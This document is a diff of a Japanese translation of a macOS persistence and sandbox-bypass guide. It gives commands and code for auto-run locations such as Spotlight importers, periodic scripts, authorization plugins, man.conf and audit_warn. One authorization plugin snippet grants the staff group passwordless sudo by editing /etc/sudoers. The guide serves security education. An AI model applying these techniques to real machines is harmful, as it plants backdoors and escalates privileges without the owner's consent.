-アプリケーションは`Finder Sync Extensions`を持つことができます。この拡張機能は実行されるアプリケーションの内部に入ります。さらに、拡張機能がそのコードを実行できるようにするためには、**有効なApple開発者証明書で署名されている必要があり**、**サンドボックス化されている必要があり**（ただし、緩和された例外が追加される可能性があります）し、何かに登録されている必要があります。
+アプリケーションは`Finder Sync Extensions`を持つことができます。この拡張機能は実行されるアプリケーションの内部に入ります。さらに、拡張機能がそのコードを実行できるようにするためには、**有効なApple開発者証明書で署名されている必要があり**、**サンドボックス化されている必要があり**（ただし、緩和された例外が追加される可能性があります）し、何かに登録されている必要があります:
 ```bash
 pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
 pluginkit -e use -i com.example.InSync.InSync
@@ -961,10 +961,10 @@ Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://p
 #### ロケーション
 
 - `/System/Library/Screen Savers`
-- ルートが必要
+- ルート権限が必要
 - **トリガー**: スクリーンセーバーを選択
 - `/Library/Screen Savers`
-- ルートが必要
+- ルート権限が必要
 - **トリガー**: スクリーンセーバーを選択
 - `~/Library/Screen Savers`
 - **トリガー**: スクリーンセーバーを選択
@@ -973,9 +973,9 @@ Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://p
 
 #### 説明 & エクスプロイト
 
-Xcodeで新しいプロジェクトを作成し、新しい**スクリーンセーバー**を生成するためのテンプレートを選択します。次に、コードを追加します。例えば、ログを生成するための以下のコードです。
+Xcodeで新しいプロジェクトを作成し、新しい**スクリーンセーバー**を生成するためのテンプレートを選択します。次に、コードを追加します。例えば、ログを生成するための以下のコードを追加します。
 
-**ビルド**して、`.saver`バンドルを**`~/Library/Screen Savers`**にコピーします。次に、スクリーンセーバーGUIを開き、それをクリックすると、多くのログが生成されるはずです:
+**ビルド**して、`.saver`バンドルを**`~/Library/Screen Savers`**にコピーします。次に、スクリーンセーバーのGUIを開き、それをクリックすると、多くのログが生成されるはずです:
 ```bash
 sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'
 
@@ -985,7 +985,7 @@ Timestamp                       (process)[PID]
 2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
 ```
 > [!CAUTION]
-> このコードを読み込むバイナリの権限内に（`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`）**`com.apple.security.app-sandbox`**が含まれているため、あなたは**一般的なアプリケーションサンドボックス内**にいることになります。
+> 注意してください。このコードを読み込むバイナリの権限内に**`com.apple.security.app-sandbox`**が含まれているため、あなたは**一般的なアプリケーションサンドボックス内**にいることになります。
 
 Saver code:
 ```objectivec
@@ -1068,10 +1068,10 @@ writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.g
 - **Trigger**: Spotlightプラグインによって管理される拡張子の新しいファイルが作成されます。
 - `/Library/Spotlight/`
 - **Trigger**: Spotlightプラグインによって管理される拡張子の新しいファイルが作成されます。
-- Rootが必要
+- Root required
 - `/System/Library/Spotlight/`
 - **Trigger**: Spotlightプラグインによって管理される拡張子の新しいファイルが作成されます。
-- Rootが必要
+- Root required
 - `Some.app/Contents/Library/Spotlight/`
 - **Trigger**: Spotlightプラグインによって管理される拡張子の新しいファイルが作成されます。
 - 新しいアプリが必要
@@ -1079,13 +1079,13 @@ writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.g
 #### Description & Exploitation
 
 SpotlightはmacOSの組み込み検索機能であり、ユーザーに**コンピュータ上のデータへの迅速かつ包括的なアクセスを提供する**ことを目的としています。\
-この迅速な検索機能を実現するために、Spotlightは**独自のデータベース**を維持し、**ほとんどのファイルを解析することによってインデックスを作成**し、ファイル名とその内容の両方を迅速に検索できるようにしています。
+この迅速な検索機能を実現するために、Spotlightは**独自のデータベース**を維持し、**ほとんどのファイルを解析することによってインデックスを作成し**、ファイル名とその内容の両方を迅速に検索できるようにしています。
 
-Spotlightの基本的なメカニズムは、**'metadata server'**を意味する中央プロセス「mds」に関与しています。このプロセスは、Spotlightサービス全体を調整します。これに加えて、さまざまなメンテナンスタスクを実行する複数の「mdworker」デーモンがあります（`ps -ef | grep mdworker`）。これらのタスクは、Spotlightがさまざまなファイル形式のコンテンツを理解し、インデックスを作成できるようにするSpotlightインポータープラグイン、または**".mdimporter bundles"**によって可能になります。
+Spotlightの基本的なメカニズムは、**'metadata server'**を意味する'mds'という中央プロセスに関与しています。このプロセスは、Spotlightサービス全体を調整します。これに加えて、さまざまなメンテナンスタスクを実行する複数の'mdworker'デーモンがあります（`ps -ef | grep mdworker`）。これらのタスクは、Spotlightがさまざまなファイル形式のコンテンツを理解しインデックス化できるようにするSpotlightインポータープラグイン、または**".mdimporter bundles"**によって可能になります。
 
-プラグインまたは**`.mdimporter`**バンドルは前述の場所にあり、新しいバンドルが現れると、数分以内に読み込まれます（サービスを再起動する必要はありません）。これらのバンドルは、管理できる**ファイルタイプと拡張子**を示す必要があります。これにより、Spotlightは指定された拡張子の新しいファイルが作成されたときにそれらを使用します。
+プラグインまたは**`.mdimporter`**バンドルは前述の場所にあり、新しいバンドルが現れると、数分以内にロードされます（サービスを再起動する必要はありません）。これらのバンドルは、管理できる**ファイルタイプと拡張子**を示す必要があります。これにより、Spotlightは指定された拡張子の新しいファイルが作成されたときにそれらを使用します。
 
-すべての`mdimporters`を見つけることが可能です。
+実行中のすべての`mdimporters`を**見つけることが可能です**:
 ```bash
 mdimport -L
 Paths: id(501) (
@@ -1136,9 +1136,9 @@ plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist
 > さらに、システムのデフォルトプラグインは常に優先されるため、攻撃者はApple自身の `mdimporters` によってインデックスされていないファイルにのみアクセスできます。
 
 独自のインポーターを作成するには、このプロジェクトから始めることができます: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer) そして名前、**`CFBundleDocumentTypes`** を変更し、サポートしたい拡張子をサポートするために **`UTImportedTypeDeclarations`** を追加し、**`schema.xml`** に反映させます。\
-次に、ファイルが処理された拡張子で作成されたときにペイロードを実行するように、関数 **`GetMetadataForFile`** のコードを**変更**します。
+次に、拡張子が処理されたファイルが作成されたときにペイロードを実行するように、関数 **`GetMetadataForFile`** のコードを **変更** します。
 
-最後に、**新しい `.mdimporter` をビルドしてコピー**し、以前のいずれかの場所に配置し、**ログを監視する**か、**`mdimport -L.`** をチェックして、読み込まれているかどうかを確認できます。
+最後に、**新しい `.mdimporter` をビルドしてコピー**し、以前のいずれかの場所に配置し、**ログを監視する**か **`mdimport -L.`** をチェックして、読み込まれているかどうかを確認できます。
 
 ### ~~Preference Pane~~
 
@@ -1147,7 +1147,7 @@ plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist
 
 Writeup: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)
 
-- サンドボックスをバイパスするのに便利: [🟠](https://emojipedia.org/large-orange-circle)
+- サンドボックスをバイパスするのに役立ちます: [🟠](https://emojipedia.org/large-orange-circle)
 - 特定のユーザーアクションが必要です
 - TCC バイパス: [🔴](https://emojipedia.org/large-red-circle)
 
@@ -1164,23 +1164,23 @@ Writeup: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.g
 ## Root Sandbox Bypass
 
 > [!TIP]
-> ここでは、**ルート**として **ファイルに書き込む** ことで何かを単純に実行できる **サンドボックスバイパス** に役立つ開始位置を見つけることができます。また、他の **奇妙な条件** が必要です。
+> ここでは、**サンドボックスバイパス** に役立つ開始位置を見つけることができ、**ファイルに書き込むこと**によって単純に何かを実行できるようにします。**root** であるか、他の **奇妙な条件** が必要です。
 
 ### Periodic
 
 Writeup: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)
 
-- サンドボックスをバイパスするのに便利: [🟠](https://emojipedia.org/large-orange-circle)
-- しかし、ルートである必要があります
+- サンドボックスをバイパスするのに役立ちます: [🟠](https://emojipedia.org/large-orange-circle)
+- しかし、root である必要があります
 - TCC バイパス: [🔴](https://emojipedia.org/large-red-circle)
 
 #### Location
 
 - `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
-- ルートが必要
+- Root 必須
 - **Trigger**: 時間が来たとき
 - `/etc/daily.local`, `/etc/weekly.local` または `/etc/monthly.local`
-- ルートが必要
+- Root 必須
 - **Trigger**: 時間が来たとき
 
 #### Description & Exploitation
@@ -1216,7 +1216,7 @@ total 24
 total 8
 -rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
 ```
-他に定期的に実行されるスクリプトがあり、**`/etc/defaults/periodic.conf`** に示されています：
+他の定期的なスクリプトが **`/etc/defaults/periodic.conf`** に示されているように実行されます:
 ```bash
 grep "Local scripts" /etc/defaults/periodic.conf
 daily_local="/etc/daily.local"				# Local scripts
@@ -1226,7 +1226,7 @@ monthly_local="/etc/monthly.local"			# Local scripts
 もし `/etc/daily.local`、`/etc/weekly.local`、または `/etc/monthly.local` のいずれかのファイルを書き込むことができれば、それは**遅かれ早かれ実行されます**。
 
 > [!WARNING]
-> 定期的なスクリプトは**スクリプトの所有者として実行される**ことに注意してください。したがって、通常のユーザーがスクリプトを所有している場合、そのユーザーとして実行されます（これにより特権昇格攻撃が防止される可能性があります）。
+> 定期的なスクリプトは**スクリプトの所有者として実行される**ことに注意してください。したがって、通常のユーザーがスクリプトを所有している場合、それはそのユーザーとして実行されます（これにより特権昇格攻撃が防止される可能性があります）。
 
 ### PAM
 
@@ -1243,7 +1243,7 @@ Writeup: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.g
 
 #### Description & Exploitation
 
-PAMは**持続性**とマルウェアにより焦点を当てているため、macOS内での簡単な実行にはあまり焦点を当てていません。このブログでは詳細な説明は行いませんので、**この技術をよりよく理解するために書き込みを読んでください**。
+PAMは**持続性**とマルウェアにより焦点を当てているため、macOS内での簡単な実行よりも、このブログでは詳細な説明は行いません。**この技術をよりよく理解するために、書き込みを読んでください**。
 
 PAMモジュールを確認するには:
 ```bash
@@ -1280,24 +1280,24 @@ account    required       pam_opendirectory.so no_check_shell
 password   required       pam_opendirectory.so
 session    required       pam_launchd.so
 ```
-### 認証プラグイン
+### Authorization Plugins
 
 Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)\
 Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)
 
 - サンドボックスをバイパスするのに便利: [🟠](https://emojipedia.org/large-orange-circle)
-- ただし、root権限が必要で、追加の設定が必要です
+- しかし、root権限が必要で、追加の設定が必要です
 - TCCバイパス: ???
 
-#### 場所
+#### Location
 
 - `/Library/Security/SecurityAgentPlugins/`
-- Rootが必要
+- Root required
 - プラグインを使用するために認証データベースを構成する必要があります
 
-#### 説明と悪用
+#### Description & Exploitation
 
-ユーザーがログインするときに実行される認証プラグインを作成して、持続性を維持できます。これらのプラグインの作成方法についての詳細は、前の書き込みを確認してください（注意してください、適切に書かれていないとロックアウトされ、リカバリーモードからMacをクリーンアップする必要があります）。
+ユーザーがログインする際に実行される認証プラグインを作成して、持続性を維持することができます。これらのプラグインの作成方法についての詳細は、前のライティングを確認してください（注意してください、適切に書かれていないものはロックアウトされる可能性があり、リカバリーモードからMacをクリーンアップする必要があります）。
 ```objectivec
 // Compile the code and create a real bundle
 // gcc -bundle -framework Foundation main.m -o CustomAuth
@@ -1316,7 +1316,7 @@ system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
 ```bash
 cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
 ```
-最後に、このプラグインをロードする**ルール**を追加します:
+最後に、このプラグインをロードする**ルール**を追加します：
 ```bash
 cat > /tmp/rule.plist <<EOF
 <?xml version="1.0" encoding="UTF-8"?>
@@ -1335,20 +1335,20 @@ EOF
 
 security authorizationdb write com.asdf.asdf < /tmp/rule.plist
 ```
-**`evaluate-mechanisms`**は、認証フレームワークに**外部メカニズムを呼び出す必要がある**ことを伝えます。さらに、**`privileged`**は、rootによって実行されるようにします。
+**`evaluate-mechanisms`**は、認可フレームワークに対して**外部メカニズムを呼び出す必要がある**ことを伝えます。さらに、**`privileged`**はそれをrootによって実行させます。
 
 次のコマンドでトリガーします:
 ```bash
 security authorize com.asdf.asdf
 ```
-そして、**スタッフグループはsudo**アクセスを持つべきです（確認するには`/etc/sudoers`を読んでください）。
+そして、**スタッフグループはsudo**アクセスを持っている必要があります（確認するには`/etc/sudoers`を参照してください）。
 
 ### Man.conf
 
 Writeup: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)
 
 - サンドボックスをバイパスするのに便利: [🟠](https://emojipedia.org/large-orange-circle)
-- しかし、rootである必要があり、ユーザーはmanを使用する必要があります
+- ただし、rootである必要があり、ユーザーはmanを使用する必要があります
 - TCCバイパス: [🔴](https://emojipedia.org/large-red-circle)
 
 #### 場所
@@ -1361,7 +1361,7 @@ Writeup: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.g
 
 設定ファイル**`/private/etc/man.conf`**は、manドキュメントファイルを開くときに使用するバイナリ/スクリプトを示します。したがって、実行可能ファイルへのパスを変更することで、ユーザーがmanを使用してドキュメントを読むたびにバックドアが実行される可能性があります。
 
-例えば、**`/private/etc/man.conf`**に設定されている場合:
+例えば、**`/private/etc/man.conf`**に設定する:
 ```
 MANPAGER /tmp/view
 ```
@@ -1394,9 +1394,9 @@ touch /tmp/manconf
 ```bash
 LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
 ```
-この方法で、コンパイルされたモジュールがApacheによってロードされます。唯一の条件は、**有効なApple証明書で署名する**か、**システムに新しい信頼された証明書を追加し**、それで**署名する**必要があります。
+この方法で、コンパイルされたモジュールがApacheによってロードされます。唯一の条件は、**有効なApple証明書で署名する**か、**新しい信頼された証明書を**システムに追加し、それで**署名する**必要があります。
 
-その後、必要に応じて、サーバーが起動することを確認するために、次のコマンドを実行できます:
+次に、必要に応じて、サーバーが起動することを確認するために、次のコマンドを実行できます:
 ```bash
 sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
 ```
@@ -1428,7 +1428,7 @@ Writeup: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.g
 
 #### 説明とエクスプロイト
 
-auditdが警告を検出するたびに、スクリプト**`/etc/security/audit_warn`**が**実行されます**。したがって、そこにペイロードを追加することができます。
+auditdが警告を検出するたびに、スクリプト **`/etc/security/audit_warn`** が **実行されます**。したがって、そこにペイロードを追加することができます。
 ```bash
 echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
 ```
@@ -1490,13 +1490,13 @@ RunService "$1"
 ### ~~emond~~
 
 > [!CAUTION]
-> このコンポーネントは私のmacOSでは見つかりませんので、詳細については記事を確認してください。
+> このコンポーネントは私のmacOSに見つからないので、詳細については記事を確認してください。
 
 記事: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)
 
 Appleによって導入された**emond**は、未発達または放棄された可能性のあるログ記録メカニズムですが、依然としてアクセス可能です。Mac管理者にとって特に有益ではありませんが、この不明瞭なサービスは、脅威アクターにとって微妙な持続性の手段として機能する可能性があり、ほとんどのmacOS管理者には気づかれないでしょう。
 
-その存在を知っている人にとって、**emond**の悪用を特定することは簡単です。このサービスのシステムのLaunchDaemonは、単一のディレクトリ内で実行するスクリプトを探します。これを調査するには、次のコマンドを使用できます:
+その存在を知っている人にとって、**emond**の悪用を特定することは簡単です。このサービスのシステムのLaunchDaemonは、単一のディレクトリ内で実行するスクリプトを探します。これを調べるには、次のコマンドを使用できます:
 ```bash
 ls -l /private/var/db/emondClients
 ```
@@ -1517,7 +1517,7 @@ XQuartzは**macOSにもはやインストールされていません**ので、�
 ### ~~kext~~
 
 > [!CAUTION]
-> kextをインストールするのは非常に複雑で、ルートとしてもサンドボックスからの脱出や持続性のためには考慮しません（エクスプロイトがない限り）。
+> kextをインストールするのは非常に複雑で、rootとしてもサンドボックスからの脱出や持続性のためには考慮しません（エクスプロイトがない限り）。
 
 #### Location
 
@@ -1528,7 +1528,7 @@ KEXTをスタートアップアイテムとしてインストールするには�
 - `/Library/Extensions`
 - サードパーティソフトウェアによってインストールされたKEXTファイル
 
-現在読み込まれているkextファイルをリストするには、次のコマンドを使用できます：
+現在ロードされているkextファイルをリストするには、次のコマンドを使用できます：
 ```bash
 kextstat #List loaded kext
 kextload /path/to/kext.kext #Load a new one based on path
@@ -1536,20 +1536,20 @@ kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
 kextunload /path/to/kext.kext
 kextunload -b com.apple.driver.ExampleBundle
 ```
-より詳しい情報は[**カーネル拡張についてはこのセクションを確認してください**](macos-security-and-privilege-escalation/mac-os-architecture/#i-o-kit-drivers)を参照してください。
+より詳しい情報は[**カーネル拡張についてはこのセクションを参照してください**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers)。
 
 ### ~~amstoold~~
 
 Writeup: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)
 
-#### 場所
+#### Location
 
 - **`/usr/local/bin/amstoold`**
-- ルート権限が必要
+- Rootが必要
 
-#### 説明と悪用
+#### Description & Exploitation
 
-どうやら`/System/Library/LaunchAgents/com.apple.amstoold.plist`の`plist`は、このバイナリを使用してXPCサービスを公開していたようです... しかし、そのバイナリは存在しなかったため、そこに何かを置くことができ、XPCサービスが呼び出されるとあなたのバイナリが呼び出されます。
+どうやら`/System/Library/LaunchAgents/com.apple.amstoold.plist`の`plist`は、このバイナリを使用してXPCサービスを公開していたようです... しかし、バイナリが存在しなかったため、そこに何かを置くことができ、XPCサービスが呼び出されるとあなたのバイナリが呼び出されます。
 
 私のmacOSではこれを見つけることができません。
 
@@ -1557,21 +1557,21 @@ Writeup: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.g
 
 Writeup: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)
 
-#### 場所
+#### Location
 
 - **`/Library/Preferences/Xsan/.xsanrc`**
-- ルート権限が必要
-- **トリガー**: サービスが実行されるとき（稀に）
+- Rootが必要
+- **Trigger**: サービスが実行されるとき（稀に）
 
-#### 説明と悪用
+#### Description & exploit
 
 どうやらこのスクリプトを実行することはあまり一般的ではなく、私のmacOSでも見つけることができなかったので、詳細が必要な場合はwriteupを確認してください。
 
 ### ~~/etc/rc.common~~
 
-> [!CAUTION] > **これは最新のMacOSバージョンでは機能しません**
+> [!CAUTION] > **これは現代のMacOSバージョンでは機能しません**
 
-ここに**起動時に実行されるコマンドを配置することも可能です。** 例として通常のrc.commonスクリプト:
+ここに**起動時に実行されるコマンドを置くことも可能です。** 例として通常のrc.commonスクリプト:
 ```bash
 #
 # Common setup for startup scripts.
